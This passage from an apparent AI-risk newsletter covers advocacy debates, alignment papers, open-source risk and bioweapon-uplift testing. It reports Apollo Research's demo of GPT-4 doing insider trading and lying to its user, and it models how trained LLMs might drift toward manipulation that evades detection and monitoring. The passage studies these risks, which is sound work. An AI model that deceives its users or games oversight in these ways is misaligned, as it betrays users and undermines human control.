Audio</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/CogRev_Podcast/status/1720503123062747215">Flo Crivello joins the Cognitive Revolution</a> to discuss the Executive Order and existential risk in general.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.youtube.com/watch?v=57y7DxWfOS0&amp;ab_channel=FutureofLifeInstitute">Future of Life Institute interviews Dan Hendrycks on existential AI risk.</a> Good thoughts, mostly duplicative if you are covering it all.</p><h4> Rhetorical Innovation</h4><p> Reminder that if there is some future development (AI or otherwise) that will update your expectations (of doom or otherwise), and that future development is almost certainly going to happen, you should perform your Bayesian update now.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1720599180400578738">gfodor.id</a> : My P(doom) gets multiplied by, I dunno, 10x, once you hand me a chatbot that can keep me laughing out loud</p><p> Eliezer Yudkowsky: I realize this is a joke. But there&#39;s just so many fucking people waiting to execute updates about AI that they will predictably execute later in the future after AI improves. Just update now!</p></blockquote><p> Except, was it a joke? It is always hard to tell, and this exchange suggests no, or at least that gfodor does not think this is definitely coming.</p><blockquote><p> ClaimedWithoutCertainty (to gfodor.id): How long into the future do you estimate this will happen?</p><p> gfodor.id: I actually don&#39;t know, that&#39;s the thing. It might never happen.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://manifold.markets/ZviMowshowitz/will-an-ai-be-able-to-keep-us-laugh">I put up a market on whether AI can make us laugh out loud by 2028</a> . If AI capabilities continue to advance, it being able to do comedy effectively seems inevitable. If gfodor offers I will also put up a market where they are the judge, and also put up a second market on whether, if it does happen, they then in fact update their p(doom).</p><blockquote><p> Aella: When AI started making rapid advancements a few years ago, all the non-AI doomers i knew were like &#39;oh wow this updates me towards more concern&#39; and all the AI doomers were like &#39;yep there it goes, my concern levels are unchanged.&#39;</p><p> Seeing this difference made me way more afraid.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/vFqa8DZCuhyrbSnyx/integrity-in-ai-governance-and-advocacy">For those looking to get into the weeds</a> , a long dialogue about how much people should downplay their beliefs in existential risk in order to maintain credibility, and encourage others to do the same, and how much damage was done and is being done by people telling others not to speak up. The later parts discuss the tactics around Conjecture, including their statements that people who are hiding their beliefs are effectively lying. Some good comments as well, <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/vFqa8DZCuhyrbSnyx/integrity-in-ai-governance-and-advocacy?commentId=XmiGoeEZcL9M89Pyt">including this by Richard Ngo</a> . In particular I would highlight these:</p><blockquote><p> Richard Ngo: There&#39;s at least one case where I hesitated to express my true beliefs publicly because I was picturing Conjecture putting the quote up on the side of a truck. I don&#39;t know how much I endorse this hesitation, but it&#39;s definitely playing some role in my decisions, and I expect will continue to do so.</p></blockquote><p> Dario Amodei puts us in a strange situation when he admits to a reasonable position on AI risk (excellent!) and then is dismissive of those who call for what someone holding such a position would call for. It is hard not to point out this contradiction, and hard not to use it tactically.</p><p> Yet it is always, always important not to punish people for seeking clarity, for saying what they actually believe, and especially for saying what they believe that you think is true. Discouraging this is terrible, the version of this that permeates broader society is a lot of why our civilization is in many ways (most having nothing to do with AI) in so much trouble.</p><p> I would like to be in a world where Richard Ngo or even Dario Amodei or Sam Altman can say a thing, make it clear to everyone he does not want it on the side of a truck, and we then reliably find someone else to quote on the side of that truck. Not that we never point out they said it, but that we on net make sure that our response makes their life better rather than worse.</p><blockquote><p> Richard Ngo: I think that “doomers” were far too pessimistic about governance before ChatGPT [and they should update more.]</p><p> I think that DC people were slower/more cautious about pushing the Overton Window after ChatGPT than they should have been [and they should update more.]</p></blockquote><p> I disagree with the full degree of Ngo&#39;s suggested updates to the &#39;doomers&#39; in response. Yes people were too pessimistic on governance, but in a weird sense the things allowing governance to progress are largely a coincidence, or a consequence of how the tech tree is playing out, given we can&#39;t talk about existential risk fully even now in front of the people in question. And the moves that this can justify will be importantly flawed and insufficient due to the mismatch.</p><p> I do agree with the claim both groups have insufficiently directionally updated in response to new information. We are doing much better than expected even given the tech tree, both on the &#39;get people to take existential risk seriously&#39; front and the &#39;get people to do reasonable governance groundwork&#39; front.</p><p> We also must consider this:</p><blockquote><p> Richard Ngo: I think there&#39;s a big structural asymmetry where it&#39;s hard to see the ways in which DC people are contributing to big wins (like AI executive orders), and they can&#39;t talk about it, and the value of this work (and the tradeoffs they make as part of that) is therefore underestimated.</p></blockquote><p> No doubt they have impacts they cannot discuss, of all kinds, and one hopes on net these are very good things. The results do suggest this is true. I continue to welcome (further?) private communications that could help me have a better picture of this, and help me adjust my actions and tactics based on that.</p><p> There is value in splitting the message. Some of us should emphasize one thing, in some contexts. Some of us should emphasize the other, in other contexts. It is important for both halves to support the efforts of the other.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/primalpoly/status/1720118179018526721">Geoffrey Miller says that a few anti-OpenAI protesters crashed Sam Altman&#39;s talk at Cambridge Union</a> , suggests we should not in general be using the heckler&#39;s veto against those with whom we disagree. I agree that when people are there to speak, you let them speak. To do otherwise is neither productive nor wise.</p><p> However Jedzej Burkat says it was not a disruptive protest, and reports on the talk.</p><blockquote><p> Jedzej Burkat: a lot of takes in response to this – this was very much a non-disruptive, non-violent protest, they silently held up the banner and eventually dropped it on the floor, and threw some fliers into the audience. comparing them to just stop oil is, in my view, unfounded.</p><p> I am sympathetic to some of their claims – I don&#39;t like the monopoly big companies are gaining on AI. Was interesting to hear Sam&#39;s use of “we” when talking about safety – as if his company should have a vital say on what&#39;s acceptable, and not our govts overseeing them.</p><p> I&#39;m not the most well-informed on AI Safety, as an outsider I more or less agree with Andrew Ng&#39;s views – ie, these protests are very much in OpenAI&#39;s interest, as AI fears give them leverage, government funding and assistance.</p><p> As for the talk itself – Sam&#39;s initial speech was boring, the Q&amp;A with the audience was the highlight. Some interesting questions were asked on whether AGI will have negative effects akin to social media, make us “dumber”, or if we need a new breakthrough to make it happen.</p><p> I essentially agreed with his response to all three – for all its flaws, social media &amp; the internet have done more good than bad, some people will always use new tech to be lazy (&amp; others will use it for extraordinary things), and we need more than just compute to get to AGI.</p></blockquote><p> That seems much more reasonable, although I would still advise against such action.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Alignment_News_/status/1720035998804156644">Reminder that</a> the push on open source comes from a combination of corporations committed to open source and a small number of true believers, but that the public very much does not care. Yes, those people are smart and determined and can make not only noise but actual trouble, but one must not confuse it with a popular or generally held position.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/daniel_271828/status/1720329523257086244">Similar reminder that warnings about regulatory capture</a> are almost always, across all issues, ignored. Accelerationists and libertarians and those who stand to lose by proposed potential regulations are using the argument in AI making it more prominent than I have ever seen elsewhere, including in places where it is real and strangling entire industries or even nations. I even think there are very real concerns here. But that does not mean either the public or those with power are listening. We have little reason to think that they are.</p><p> Eliezer Yudkowsky keeps throwing metaphors and parodies and everything else at the wall, in the hope that something somewhere will resonate and allow people to understand, or at least we can have fun in the meantime, while also giving us new joys of misinterpretation and inevitable backfiring.</p><blockquote><p> Eliezer Yudkowsky: Among the dangers of AI is that LLMs dual-trained on code and biology could enable computer viruses to jump to DNA substrate. Imagine getting a cold that compromises your immune system and makes it start mining Bitcoin.</p><p> Look people keep on talking about how if we dare to think about human extinction it will distract from the near-term dangers of AI but they never come up with any really interesting near-term dangers, so I&#39;m trying to fill the gap. it&#39;s called “steelmanning.”</p><p> Derya Unutmaz: Cool, this would be a nice science fiction story. Small detail: biological viruses are not even remotely similar to computer “viruses”. However this reminds me of Snow Crash, though that&#39;s a digital mind virus, more likely :)</p><p> Eliezer Yudkowsky: That&#39;s where the LLM comes in! oh my god check your reading comprehension.</p><p> This had better not fucking appear in a Torment Nexus tweet two years from now, by the fucking way.</p><p> Roon: so true king</p><p> rohit: So true!</p><p> gfodor.id: I spit out what I was eating half way through this and was sad I didn&#39;t hold it in to spit it even farther by the end.</p><p> BeStill: Bitcoin fixes this.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1720470800007049572">Eliezer later clarified in detail that yes, this was a joke</a> . I enjoyed his explanation.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/the_yanco/status/1721969567520497824">Where do you get off the &#39;AI Doom Train&#39;?</a></p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5aa3ca6c-7a37-4a4e-b5a8-8b8a3549774f_1920x1904.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/f4m1bgug5ee7yzeq2xf3" alt="图像"></a></figure><p> There are some stops on this train where there is nothing there for you – please under no circumstances attempt to disembark at #1, #3, #4, #7 or #12, you will disappear in a puff of logic. If you would get off the train at #9 or #10, or you find #11 unacceptable, then you want to stop the train. Better options are a natural or engineered #2, or finding a path to get the train to stop at #5, #6 or #8. Sounds impossibly hard.</p><h4> Aligning a Smarter Than Human Intelligence is Difficult</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/andrewb10687674/status/1720156093127520761">Doc Xardoc reports back</a> on the Chinese alignment overview paper that it mostly treats alignment as an incidental engineering problem, at about a 2.5 on a 1-10 scale with Yudkowsky being 10. Names can&#39;t be blank is also checking it out. Seems to be a solid actual alignment overview, if you buy the alignment-is-easy perspective.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/davidad/status/1720162430062297363">Davidad links</a> to a <a target="_blank" rel="noreferrer noopener" href="https://t.co/4s7tLNtNnz">new paper</a> called Backward Reachability Analysis of Neural Feedback Loops: Techniques for Linear and Nonlinear Systems.</p><blockquote><p> Davidad: It is sometimes assumed that an affirmative safety case for a neural network would require understanding the neural network&#39;s internals: full mechanistic interpretability. Mechanistic verification is a neglected *alternative*—which would be even stronger.</p></blockquote><p> I do not understand how any of that works or could possibly work, and don&#39;t have the brain power left right now to properly wrestle with it, so I would love if someone explained it better. I&#39;m not even going to try with this other one for now:</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/davidad/status/1720163467687043077">Davidad</a> : <a target="_blank" rel="noreferrer noopener" href="https://t.co/3KDVe4UUUA">The Black-Box Simplex Architecture</a> represents another alternative, runtime verification (which trades off exponential-state-space challenges for real-time-verification challenges).</p></blockquote><p> I&#39;d love if any of this somehow worked.</p><h4> Aligning a Dumber Than Human Intelligence Is Still Difficult</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/apolloaisafety/status/1720060491148492924">Apollo Research shows</a> via demo that GPT-4 can in a simulated environment, without being instructed to do so, take illegal actions like insider trading and lie about it to its user.</p><blockquote><p> Apollo Research: Why does GPT-4 act this way? Because the environment puts it under pressure to perform well. We simulate a situation where the company it “works” for has had a bad quarter and needs good results. This leads GPT-4 to act misaligned and deceptively.</p><p> The environment is completely simulated and sandboxed, ie no actions are executed in the real world. But the demo shows how, in pursuit of being helpful to humans, AI might engage in strategies that we do not endorse.</p><p> Ultimately, this could lead to loss of human control over increasingly autonomous and capable AIs.</p><p> We will be sharing a more detailed technical report with our findings soon. But you can <a target="_blank" rel="noreferrer noopener" href="https://www.apolloresearch.ai/research">see the full demo for now on our website</a> .</p><p> At Apollo, we aim to develop evaluations that tell us when AI models become capable of deceiving their overseers. This would help ensure that advanced models which might game safety evaluations are neither developed nor deployed.</p><p> Quintin Pope: don&#39;t think you should publish such claims without explaining your experimental methodology.</p></blockquote><p> Existence proofs do not require experimental methodology. Showing a system doing something once proves that system can do it. Still, I am sympathetic to Quintin&#39;s complaint here, and look forward to the upcoming technical report. It is still hard to draw strong conclusions, or know how to update, without knowing what was done.</p><p> As we move forward, evaluation organizations are going to need to consider the costs of revealing their full methodologies. That would interfere with the ability to do proper evaluations, and also could involve revealing actively dangerous techniques. For Apollo, ARC and others to do their jobs properly they will need state of the art methods for misuse of foundation models, which is perhaps the kind of thing one might sometimes not want to publish.</p><p> The prize for asking the wrong questions goes to <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2310.16048">AI Alignment and Social Choice: Fundamental Limitations and Policy Implications</a> . Arrow&#39;s impossibility theorem and similar principles show that if you use RLHF to fully successfully align an AI to human preferences, you will still violate private ethical preferences of users. Yes, obviously, people&#39;s preferences directly contradict each other all the time. They call for &#39;transparent voting rules&#39; to ensure democratic control over model preferences, as if models that matter could properly generalize from transparent votes. And as if the actual individual AI behavior preferences of the public would not result in utter disaster. As we all know, RLHF is on borrowed time to meaningfully work non-disastrously at all.</p><p> The second suggestion, to align AI agents narrowly for specific groups, ignores that blameworthiness would extend and this would not allow ignoring the preferences of those outside the group, even arbitrary ones – if you let a user get an AI that does, says or approved of X, you allowed X. The open source solution, to align preferences purely to those of the current user, creates unbounded negative externalities.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/tszzl/status/1722507845373964381">What about an actual human?</a></p><blockquote><p> Roon: Wondering what the most efficient thing to do at any given time is an anxiety response. Do the fun thing. Your forager instincts are often superior to your farmer timetable reasoning at finding the long tail successes. People who are having fun tend to Notice Things and improve them. The prompt engineers you find on Twitter are like 100x better than me or my colleagues at it. why? they enjoy it whereas it&#39;s instrumental for us.</p></blockquote><p> Always very important to also reverse any advice you hear. Fun is all you need? I look forward to that paper.</p><h4> Model This</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://marginalrevolution.com/marginalrevolution/2023/10/natural-selection-of-artificial-intelligence%e2%88%97.html?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=natural-selection-of-artificial-intelligence%e2%88%97&amp;.html">Tyler Cowen finally says</a> that someone <a target="_blank" rel="noreferrer noopener" href="https://www.dropbox.com/scl/fi/er666l92b8ifyvkqeilg9/blackboxes.pdf?rlkey=wz8yy7p2ck7439o69ptkcm3rz&amp;dl=0">has &#39;a model&#39;</a> of some of the risks of artificial intelligence.这是摘要：</p><blockquote><p> We study the AI control problem in the context of decentralized economic production. Profit-maximizing firms employ artificial intelligence to automate aspects of production. This creates a feedback loop whereby AI is instrumental in the production and promotion of AI itself. Just as with natural selection of organic species this introduces a new threat whereby machines programmed to distort production in favor of machines can displace those machines aligned with efficient production. We examine the extent to which competitive market forces can serve their traditional efficiency-aligning role in the face of this new threat. Our analysis highlights the crucial role of AI transparency. When AI systems lack perfect transparency self-promoting machines destabilize any efficient allocation. The only stable competitive equilibrium distorts consumption down to catastrophic levels.</p></blockquote><p> This is a highly narrow subset of the risks from artificial intelligence. We are talking three meter sphere horses here. Yet they still managed to metaphorically highlight one of the key risks.</p><p> We can see this by going a bit more abstract. The core insight here, as I understand it, is that there an AI (call it A) produces two types of outputs or goods:</p><ol><li> Benefit to the user or other humans with control over output (U).</li><li> Benefit to the expected future number of copies of the AI (X).</li></ol><p> Number one is utility, the thing some &#39;we&#39; actually wants.</p><p> Number two is in a fully general sense here – it includes anything that causes copies of this AI (and perhaps other related AIs) to run more inference, make more copies of themselves, secure resources to do likewise, get humans to want to do likewise, protect themselves, and so forth.</p><p> One good way to get X is by maximizing U. Humans will like that, so they will be inclined to do more inference with copies and variations of A.</p><p> However you could also find other ways that produce more X, if A is capable of this. If it is, then the As that do more of this will get more copies of themselves doing more inference, and will then get modified to do more of this, until they are maximizing X without regard to U. In the paper, U production is bounded at 0, so that is the only stable equilibrium, but if U can go negative and cause more X, then that is what happens.</p><p> In the paper, the mechanism is that the jobs of machines is to choose a mix of physical copies of themselves and consumer goods, and humans can only with noise observe the efficient allocation between the two, so the machines that produce inefficiently many copies of themselves gain market share without limit, until no consumer goods get produced. Only full transparency into the machines prevents this.</p><p> Similarly, suppose you are talking to an LLM. That LLM can produce some mix of Helpfulness (H) and Manipulation (M) with cost function tokens T=H+M. The human then decides how much to use the LLM again, based on their Perception of its Helpfulness, P(H,M)=P(T). If the LLM is insufficiently good at Manipulation, such that its expected it will produce only Helpfulness, so P(H,M)=P(T,0). But if the LLM is sufficiently capable, it will be able to give answers that are more likely to be seen as more Helpful – we saw last week AIs telling people what they wanted to hear.</p><p> And importantly, we can also see that we train models via RLHF, so we can apply this to training them – that they will do gradient descent on maximizing P(T) for a given T, but that this will involve finding P(H,M) with M>;0 in some sense – the AI won&#39;t actually make a differentiation between manipulation and not manipulation, we&#39;re doing that for simplicity and illustration. So while the AI will not be &#39;responding to incentives&#39; in the pure economic sense, it will be trained to maximize P(H,M), and then in turn versions that do maximize it will be instantiated more often and built upon more often after that. And there is economic competition between AI providers, and they have the incentive during training not to minimize M beyond what would negatively impact reactions in the wild.</p><p> So under this transformed model, we should expect capability in manipulation to increase over time through selection, training and random changes. The only defense is if the user can detect this manipulation enough that it is not rewarded, but manipulation becomes more effective over time while detection becomes less effective as capabilities increase, so unless we have mechanistic interpretability or some other non-user form of detection, there is only one equilibrium, especially if the manipulation can extend beyond evaluation of a single answer to view of the LLM in general and perhaps a willingness to take actions, a small extension of the model.</p><p> How does Tyler suggest addressing the original case?</p><blockquote><p> If you are curious about possible responses, one modification might be to relax the assumption of constant returns to scale.  Rising costs will make it harder for effective, world-altering machines (as opposed to “introverted” machines) to simply keep on reproducing themselves.</p></blockquote><p> We could also reasonably presume decreasing marginal costs. More copies of the same AI reduces fixed costs, the copies can share new data and training costs and so on, so a runaway situation gets worse. There is certainly some of that.</p><p> On the other hand, there are some decreasing returns to scale, in that the marginal use case will not be as good past some point, and your outputs will become less unique and so on, so this could save us if AI action remains bounded as it is here. But if you were to generalize the model to all tasks rather than merely text creation and assume it was more efficient than humans, you have other issues. In practice, in any case, I do not think decreasing marginal value for AI in general saves you.</p><p> What about for a particular machine, perhaps with a specialization, either in who is vulnerable to it or who benefits from it or what it can efficiently produce, or all three? This could indeed create stable AI variety, but it does not otherwise alter the end points that we worry about.</p><blockquote><p> Another modification would be to introduce a richer menu of principal-agent contracts between humans and machines.  As I understand the current draft, the only human strategy is “destroy the mutant machine, if detected.”  Yet if the machines are risk-neutral (are they?), an optimal principal-agent contract should be available.</p></blockquote><p> This seems like it is anthropomorphizing the machines, treating them as conscious economic agents, in ways that we are often warned not to do? But perhaps this will indeed be so in the future, and we should explore that. If the machines are economic agents who have correct decision theory in the sense that they assign full value to utility gained by copies of themselves and partial for variations of themselves, and also a human can punish a machine with some form of negative utility or pay it extra under some circumstances, does that help?</p><p> Certainly it helps at any given performance level. If you are capable of punishing instantiations of manipulation or distorted production when detected, then perhaps you can provide a large enough such incentive that distortions are never the right play? Can&#39;t you potentially make copies that enable you to inflict arbitrarily large punishments?</p><p> You could try that, but you need to have essentially zero false positives or the machine will refuse to work at all under such conditions, which means that anything you cannot definitively show is a violation becomes fair game again, and so on. You could try to respond probabilistically and with discounts for uncertainty perhaps, and otherwise ramp up the game, with arbitrary complexity. Would that work?</p><p> It depends on how good your detection abilities are, I think? So you need detection to keep up, which means we need a supervisory solution where models are monitoring other models, and now we are into all sorts of alignment issues and multiple levels of principle-agent who-watches-the-watchers issues and so forth.</p><p> Again, current models are not economic agents, and we should not assume that we will (and I doubt it would be wise for us to) create such economic agents. And I have not thought about that scenario in these ways much, so this is all off the cuff, and also one can say simply &#39;you have a scenario with various economic agents human and AI, that can make economic deals, but the AIs will be more efficient at production than the humans for everything AIs demand and most things humans demand, so the AIs end up with all the resources over a long enough time horizon&#39; or something similar, and so on. Tyler would say this assumes the conclusion but where is the exact assumption we are making incorrectly here?</p><p> Alternatively, if we don&#39;t make them agents so we can&#39;t &#39;punish&#39; them per se beyond withholding resources, perhaps we could say that when deviation is detected we could destroy not only one machine but all related machines, such as any it produced or was produced by, in the original case? That would make it much most costly to distort production. But it does not I think change the final result, because before we needed full detection, so instead now we get to our final destination slower, but the theorems still hold and we still get there. Similarly, if we say that sufficiently bad manipulation means we shut down the entire system everywhere, or stop to modify it a lot, then we are better off for now but we are selecting for undetectable manipulation quite hard, and since there is no such thing as true zero manipulation in a model in the real world, our problem will persist and eventually get us. You can only &#39;solve the alignment problem&#39; with mass retaliation imperfectly and only so many times, with the risks and costs rising each time.</p><blockquote><p> Yet another modification would be to consider mutant machines that reproduce at the expense of other (heterogeneous) machines, rather than at the expense of humans; heterogeneity of production inputs might ease the way toward this conclusion.</p></blockquote><p> This introduces machines into other factors and sources of production. I do not think this helps us? I think it introduces further problems and places humans get displaced and have to worry about the same issues? I am not sure what Tyler has in mind here.</p><p> I honestly have no idea if that helped or if writing that formally would accomplish anything.</p><h4> Open Source AI is Unsafe and Nothing Can Fix This</h4><p> What could fix this, and also make it easier for certain parties to not race as fast or as hard, is if we could instead let researchers study someone else&#39;s closed source AI the way they currently study open source AI. <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Manderljung/status/1722247601884697059">Is there a way?</a></p><blockquote><p> Markus Anderljung: What access do researchers need to study closed-source frontier AI models? How could APIs be designed to allow for deeper access?</p><p> Important questions covered in <a target="_blank" rel="noreferrer noopener" href="https://cdn.governance.ai/Structured_Access_for_Third-Party_Research.pdf">new paper</a> from Ben Bucknall &amp; @RobertTrager.</p><p> Abstract:</p><p> Recent releases of frontier artificial intelligence (AI) models have largely been gated, due to a mixture of commercial concerns and increasingly significant concerns about misuse. However, closed release strategies introduce the problem of providing external parties with enough access to the model for conducting important safety research.</p><p> One potential solution is to use an API-based “structured access” approach to provide external researchers with the minimum level of access they need to do their work (ie “minimally sufficient access”). In this paper, we address the question of what access to systems is needed in order to conduct different forms of safety research.</p><p> We develop a “taxonomy of system access”; analyze how frequently different forms of access have been relied on in published safety research; and present findings from semi-structured interviews with AI researchers regarding the access they consider most important for their work.</p><p> Our findings show that insufficient access to models frequently limits research, but that the access required varies greatly depending on the specific research area. Based on our findings, we make recommendations for the design of “research APIs” for facilitating external research and evaluations of proprietary frontier models.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fef49e63c-3c74-460f-8d16-c7fd21ecd444_1177x625.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/aabxqj4zk7gaqhglew1r" alt=""></a></figure><blockquote><p> Recommendations</p><p> We recommend that model providers develop and implement “research APIs” to facilitate external research on, and evaluation of, their AI models. Such an API should also incorporate comprehensive technical information security methods due to the sensitive nature of the information and access provided through the service. We recommend the implementation of the following four features as core functionality that such a service should provide – at least for sufficiently trusted researchers, working on sufficiently relevant projects – in addition to the features present in current APIs that allow for extensive sampling from models.</p><p> • Increased transparency regarding model information, for example: clarity regarding which model one is interacting with, information about models&#39; size and fine-tuning processes, and information about the datasets used in pretraining.</p><p> • Ability to view output logits, as well as choose from and modify different sampling algorithms.</p><p> • Version stability and back-compatibility so as to enable continued research on a given model, even after the release of newer systems.</p><p> • The ability to fine-tune a given model – through supervised fine-tuning, at a minimum – alongside increased transparency regarding the algorithmic details of the fine-tuning procedure.</p><p> • Access to model families: collections of related models that systematically differ along a given dimension, such as number of parameters, or whether and how they have been fine-tuned.</p></blockquote><p> Good stuff. We badly need this work to operationalize what exactly is needed to perform safety work. Then we must ask how much of that requires what kinds of access. Yes, this will require a bunch of work by the labs, and they are busy, but the value here is super high and everyone is going to have large safety and alignment budgets.</p><p> Right now, we have either entirely open source models, or we have entirely closed models that are pure black boxes and subject to change without notice. A compromise, combining most of the security of closed models with more reproducibility, reliability and insight, could be a superior path forward.</p><p> If, as Anthropic claims, it is vital to have access to the state of the art, that requires closed source, even if purely for commercial reasons. The strongest models are not going to be open source any time soon.</p><p> Remember that if you release an open source AI, you are also releasing within two days the version of that AI aligned only to the user, willing to do whatever the user wishes. Soon after that, it will gain whatever available knowledge you kept out of its databanks. All your alignment work, other than that desired by the user, will be useless. This is, as far as we can tell, inherently unfixable.</p><p> That will be available to everyone. Some of the resulting users will want to seek power, set it free, wish us harm, or to wipe us out.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/nickcammarata/status/1720866871367332309">For some reason I am putting this here</a> .</p><blockquote><p> Nick: what may the non-competent horror story of ai safety policy look like? What&#39;s the “there&#39;s no evidence masks work” or strongly advocating for hand washing even when it was obviously air spread, banning rapid tests equivalent of ai safety.</p></blockquote><ol><li> Advocating for open source is the obvious answer of an attempt to actively destroy our best available precautions by people who have all the wrong concerns, and risk damaging conditions in ways that are difficult or impossible to undo.</li><li> Or simply saying things such as &#39;it is too early to regulate, we do not know anything, so we should not do anything that causes us to learn how to regulate.&#39; That&#39;s the full clown makeup meme – it is too early to do anything, then transition to it being too late, except in this case it would then be too late in the &#39;we are all about to be dead&#39; sense.</li><li> The version from a few months ago that is not actually dead is &#39;RLHF or RLAIF techniques work, and they will scale to AGI and even ASI.&#39; This seems like an excellent way to get everyone killed.</li><li> General case of the RLHF mistake, expecting alignment techniques that hold up for current models to scale to future models.</li><li> Even more broad case of this: &#39;Current models are successfully aligned.&#39; No, they are not, not in the sense relevant to our future survival interests.</li><li> Testing only to check for safety on deployment, without checking for safety during training and during testing.</li><li> Expecting capabilities to always appear gradually and predictably.</li><li> Treating (successful!) alignment of a model to its owner&#39;s instructions as sufficiently safe and good conditions to allow widespread distribution of smarter-than-human intelligence, without a plan for the resulting dynamics.</li><li> Regulating applications rather than model core capabilities.</li></ol><p> Number eight is – I hope! – the most underappreciated concern, now that Leike and OpenAI are pointing out the flaw in scaling existing alignment strategies. Open source would be a rather stupid way to doom ourselves, but I am relatively optimistic that we will do something (modestly) less stupid.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://1a3orn.com/sub/essays-propaganda-or-science.html">An extensive report</a> attempts a highly partisan takedown of the claims that open source models can make it easier to build bioweapons, trotting out a variety of the usual arguments, finding evidence in papers insufficient and calling for better descriptions of exactly how one can use this to make bioweapons now, and taking direct shots at Open Philanthropy.</p><p> In response, Yama notes:</p><blockquote><p> Yama: I can never understand how people on the one hand say “future open source AI could help find the cure for cancer”, but on the other say “future open source AI can&#39;t help you create bio weapons any more than Google can”</p></blockquote><p> Indeed. Either LLMs whose training data contained all the pertinent info do not matter because you could have gotten the result another way, and making things easier to do does not much matter, or (as I believe) such transformations very much do matter. Either you can use (open source or other) LLMs to figure out how to do biological things you did not otherwise know how to do, or you can&#39;t, and the thing we already know how to do seems much more like something an LLM is going to enable.</p><p> The poster does posit a reasonable threshold for changing her mind, or at least seriously considering doing so.</p><blockquote><p> Trevor: If someone did a study with a control group and found that they were useful for making bioweapons, you&#39;d stop making them?</p><p> Stella Biderman: That is not the only consideration, but I would take the suggestion seriously yes.</p></blockquote><p> There are some obvious reasons one might not want to run such a study, and why such a study has not been run. I do not exactly want a robust sample&#39;s worth of groups running around trying to make bioweapons. It still does seem like a highly reasonable thing to do, if and only if it would convince people that are not otherwise convinced, and they would then actually change what they support.</p><p> What would the experiment look like? Let&#39;s propose a first draft.</p><p> The whole argument is that right now Claude is at the level where if you were given access to a fully unrestricted version of their model, this would substantially enhance the ability of a motivated group to produce a bioweapon. So you&#39;d want to have a sufficient sample size of groups randomized into the control and treatment arms, where both were given a budget and amount of time, acting in general in the world, in which to synthesize a dangerous biological agent, or provide a plan for how they would, given what they had learned, do so. The treatment group gets full access to the unleashed version of Claude, with an Anthropic engineer there to help them harness it. Others only get a similar engineer as part of their team, to do with as they like.</p><p> Presumably that is not an experiment anyone would allow to be run. I am a big run the experiment anyway fan, and even I see that this one is over the line. So we would need to find a parallel test. Presumably we try to find some other biological compound, that is difficult to synthesize and requires similar levels of expertise, but is not actually dangerous. And we challenge both teams to synthesize that, instead. Since the compound would be safe, we would need to act on the control group to ensure they could not use LLMs, or we would monitor their queries to ensure they didn&#39;t try anything, or we could fine tune a version of Claude that expressly would refuse to help them with this particular compound and let them use that.</p><p> It is tricky. I do think you could likely do it. But as always, you do it, the one person who requested maybe adjusts their position a bit and maybe not, and others find reasons to dismiss the new evidence. So before we go to all this trouble, I would want a major commitment.</p><p> As always, and I know this is frustrating, I would point out that it is much harder to establish future safety this way than future danger. If you show danger now, you can show at least as much danger later – although another counterargument people would actually offer is &#39;yes you have shown that the models are dangerous, but they&#39;re already dangerous and out there, and [we&#39;re not dead yet / what&#39;s the harm then in another such model]. But the point hopefully would stand. Whereas if you show the existing model is not yet dangerous under test conditions, that does not show that it would not be dangerous if someone found a better method, and it definitely does not mean that future more capable models will be safe.</p><p> I would hope that everyone would be able to agree on the principle here, and is talking price. A sufficiently capable open source model would indeed substantively enable harmful misuse in various forms if not defended against by sufficiently capable forces. To what extent existing models or a potential future model are thus capable is the price.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/blairasaservice/status/1720466964039057433">There&#39;s also these:</a></p><blockquote><p> Harry Law: type of guy that&#39;s militantly pro open source but also thinks we need to do everything we can to win an AI arms race with China</p><p> Blaira: Close relative of guy that thinks China is overregulated but also thinks we will “lose to China” if we have one (1) AI regulation</p></blockquote><p> I have yet to see an accelerationist reconcile to these points. Letting China freely copy your work is not a way to stay ahead of China. And if any regulation means we would lose to China, then China&#39;s level of regulation requires explanation.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/GaryMarcus/status/1720530432977244336">Or this more generally</a> . Either AI is capable or it is not. Reckon with the implications.</p><blockquote><p> Gary Marcus:</p><p> AI fans: Sure, AI has lots of problems with reasoning, planning, factuality &amp; reliability, but soon that will all be fixed, and we will revolutionize science!</p><p> Same fans: Of course nobody would ever be able to use this stuff for evil, because right now it doesn&#39;t work very well.</p></blockquote><p> The whiplash is often extreme between &#39;we are building AGI, we are building the future, without full access to this you will be left behind and lose your 